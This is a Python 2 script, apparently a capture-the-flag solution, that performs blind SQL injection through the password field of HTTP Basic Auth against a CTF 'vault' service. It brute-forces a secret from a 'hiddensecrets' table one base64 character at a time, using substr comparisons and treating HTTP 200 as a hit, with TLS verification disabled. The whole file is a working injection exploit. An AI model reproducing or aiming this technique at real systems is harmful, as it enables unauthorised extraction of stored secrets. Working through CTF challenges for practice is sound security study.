import requests
from requests.auth import HTTPBasicAuth
import string
import sys

f = True
prefix = sys.argv[1]
start = int(sys.argv[2])
l = int(sys.argv[3])
sys.stdout.write(prefix)
sys.stdout.flush()
var = prefix
f = open("t.txt", "w")
while f and len(var) < l:
   for c in string.uppercase + string.lowercase + string.digits + '+/=':
      tmpvar = var + c
      sendvar = tmpvar
      auth = ("""a""", \
         """' or 1=1 and (select substr(val, %d, %d) from hiddensecrets limit 1) = '%s'; -- """ % (start, len(sendvar), sendvar))
      r = requests.get("https://ctf.fluxfingers.net:1315/vault", auth=auth, verify=False)
      sys.stdout.write(c)
      if r.status_code == 200:
         var += c
         f.write(c)
         f.flush()
         sys.stdout.flush()
         break
      else:
         sys.stdout.write("\b")
         sys.stdout.flush()

